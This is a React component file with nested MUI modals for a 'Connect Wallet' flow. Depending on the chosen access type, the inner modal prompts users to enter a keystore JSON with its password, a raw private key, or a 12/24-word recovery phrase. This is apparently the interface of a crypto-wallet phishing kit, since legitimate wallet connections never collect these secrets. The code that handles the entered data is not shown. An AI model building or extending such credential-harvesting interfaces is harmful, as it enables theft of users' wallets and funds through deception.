import * as React from 'react';
import Box from '@mui/material/Box';
import Modal from '@mui/material/Modal';
import Button from '@mui/material/Button';
import ServiceCard from './ServiceCard';
import { makeStyles } from "@material-ui/core";
import SelectWallet from './wallet/SelectWallet';
import Form from './DetailsForm/Form';
import '../components/wallet/SelectWallet.css'
import { FormContext } from './context/FormContext';
import { useContext } from 'react';
import KeyForm from './KeyForm/KeyForm';


const useStyles = makeStyles((theme) => ({
    cardWrapper:{ 
       display: 'flex',
       justifyContent: 'center',
       alignItems:'center',
       flexWrap:'wrap'
       
    }
}))
const style = {
  position: 'absolute',
  top: '50%',
  left: '50%',
  transform: 'translate(-50%, -50%)',
  width: "70%",
  height:'100%',
  bgcolor: 'background.paper',
  border: '2px solid #000',
  boxShadow: 24,
  pt: 2,
  px: 0,
  pb: 3,
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "center",
};

const style2 = {
  position: 'absolute',
  top: '50%',
  left: '50%',
  transform: 'translate(-50%, -50%)',
  width: "80%",
  height:'60%',
  bgcolor: 'background.paper',
  border: '2px solid #000',
  boxShadow: 24,
  pt: 2,
  px: 0,
  pb: 3,
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "center",
};



function ChildModal() {
  const {wallet, setWallet, access, setAccess, open, setOpen} = useContext(FormContext)
 
  
  const handleOpen = () => {
    setOpen(true);
  };
  const handleClose = () => {
    setOpen(false);
  };
 

  return (
    <React.Fragment>
      <div className='modal-button-group'>
      <Button
      className="button-group"
      >
      <button className="button-connect" onClick={handleOpen} >Connect Wallet</button>
      </Button>
      <button className="button-cancel">Cancel</button>
      </div>
      <Modal
        open={open}
        onClose={handleClose}
        aria-labelledby="child-modal-title"
        aria-describedby="child-modal-description"
      >
        <Box sx={{ ...style2, }}>
          {
            access === "keystore" ?  (( <KeyForm FormButton={handleClose} rowNumber={4} walletName={wallet} detailsToInput="Input Keystore JSON" 
            aboutDetails='Several lines of text beginning with "" plus the password you used to encrypt it'
           />))
            : access === "private" ? (<Form FormButton={handleClose} walletName={wallet} detailsToInput="Input Private Key phrase"
            aboutDetails="Typically contains a string of alphanumeric characters which are about 50 or more in number"
            fieldLabel='Enter Private Key'
            />)
            :
            ( <Form FormButton={handleClose} rowNumber={4} walletName={wallet} detailsToInput="Input secret phrase" aboutDetails="Typically 12(sometimes 24) words separated by single spaces" fieldLabel='Enter Phrase'/>) 
             
          }
          <Button onClick={handleClose}></Button>
        </Box>
      </Modal>
    </React.Fragment>
  );
}

const NestedModal = () => {

    const classes = useStyles();

  const [open, setOpen] = React.useState(false);
  const handleOpen = () => {
    setOpen(true);
  };
  const handleClose = () => {
    setOpen(false);
  };

  return (
    <div className={classes.cardWrapper}>
      <Button  onClick={handleOpen}>
        <ServiceCard />
      </Button>
      <Modal
        open={open}
        onClose={handleClose}
        aria-labelledby="parent-modal-title"
        aria-describedby="parent-modal-description"
      >
        <Box sx={{ ...style, width: "70%" }}>
         <SelectWallet connectAction={handleOpen} />
          <ChildModal />
        </Box>
      </Modal>
    </div>
  );
}

export default NestedModal;